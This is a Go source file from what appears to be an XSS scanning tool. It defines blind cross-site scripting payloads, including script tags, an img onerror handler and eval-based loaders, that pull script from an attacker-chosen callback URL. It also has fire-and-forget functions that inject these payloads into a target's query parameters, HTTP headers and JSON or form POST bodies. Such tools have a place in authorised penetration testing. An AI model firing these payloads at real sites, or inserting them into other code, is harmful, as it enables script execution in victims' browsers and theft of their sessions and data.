package scanner

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"time"

	"github.com/lcalzada-xor/xxss/models"
)

// BlindPayloads returns a list of blind XSS payloads using the callback URL
func BlindPayloads(callbackURL string) []string {
	return []string{
		fmt.Sprintf("\"><script src=%s></script>", callbackURL),
		fmt.Sprintf("\"><img src=x onerror=this.src='%s'>", callbackURL),
		fmt.Sprintf("javascript:eval('var a=document.createElement(\\'script\\');a.src=\\'%s\\';document.body.appendChild(a)')", callbackURL),
		fmt.Sprintf("<script>function b(){var a=document.createElement('script');a.src='%s';document.body.appendChild(a);}b();</script>", callbackURL),
	}
}

// InjectBlind performs a fire-and-forget injection of blind XSS payloads
func (s *Scanner) InjectBlind(targetURL, param, callbackURL string) {
	// We don't wait for response analysis for blind XSS, just send the requests
	payloads := BlindPayloads(callbackURL)

	u, err := url.Parse(targetURL)
	if err != nil {
		return
	}

	qs := u.Query()

	for _, payload := range payloads {
		qs.Set(param, payload)
		u.RawQuery = qs.Encode()

		req, err := http.NewRequest("GET", u.String(), nil)
		if err != nil {
			continue
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")
		for k, v := range s.headers {
			req.Header.Set(k, v)
		}

		// Fire and forget (with proper cleanup)
		go func(r *http.Request) {
			resp, err := s.client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
	}
}

// InjectBlindHeader performs a fire-and-forget injection of blind XSS payloads into headers
func (s *Scanner) InjectBlindHeader(targetURL, header, callbackURL string) {
	payloads := BlindPayloads(callbackURL)

	for _, payload := range payloads {
		req, err := http.NewRequest("GET", targetURL, nil)
		if err != nil {
			continue
		}

		req.Header.Set(header, payload)
		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")

		// Add other custom headers
		for k, v := range s.headers {
			if k != header {
				req.Header.Set(k, v)
			}
		}

		// Fire and forget (with proper cleanup)
		go func(r *http.Request) {
			resp, err := s.client.Do(r)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(req)
	}
}

// InjectBlindBody performs a fire-and-forget injection of blind XSS payloads into POST body parameters
func (s *Scanner) InjectBlindBody(config *models.RequestConfig, param, callbackURL string, params map[string]string) {
	payloads := BlindPayloads(callbackURL)

	for _, payload := range payloads {
		// Create a copy of params with the payload
		injectedParams := make(map[string]string)
		for k, v := range params {
			injectedParams[k] = v
		}
		injectedParams[param] = payload

		// Build request body based on content type
		var body string
		var contentTypeHeader string

		if config.ContentType == "application/json" {
			// Build JSON body with proper escaping
			jsonData, err := json.Marshal(injectedParams)
			if err != nil {
				continue
			}
			body = string(jsonData)
			contentTypeHeader = "application/json"
		} else {
			// Build form-urlencoded body
			formData := url.Values{}
			for k, v := range injectedParams {
				formData.Set(k, v)
			}
			body = formData.Encode()
			contentTypeHeader = "application/x-www-form-urlencoded"
		}

		req, err := http.NewRequest(string(config.Method), config.URL, nil)
		if err != nil {
			continue
		}

		// Set body
		req.Body = http.NoBody
		if body != "" {
			req.Body = http.NoBody // Will be set by client
			req.Header.Set("Content-Type", contentTypeHeader)
			req.ContentLength = int64(len(body))
		}

		req.Header.Add("User-Agent", "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.100 Safari/537.36")

		// Add custom headers
		for k, v := range s.headers {
			req.Header.Set(k, v)
		}

		// Fire and forget (with proper cleanup and timeout)
		go func(bodyStr string) {
			ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
			defer cancel()
			req2, err := http.NewRequestWithContext(ctx, string(config.Method), config.URL, strings.NewReader(bodyStr))
			if err != nil {
				return
			}
			req2.Header = req.Header.Clone()
			resp, err := s.client.Do(req2)
			if err == nil && resp != nil {
				resp.Body.Close()
			}
		}(body)
	}
}
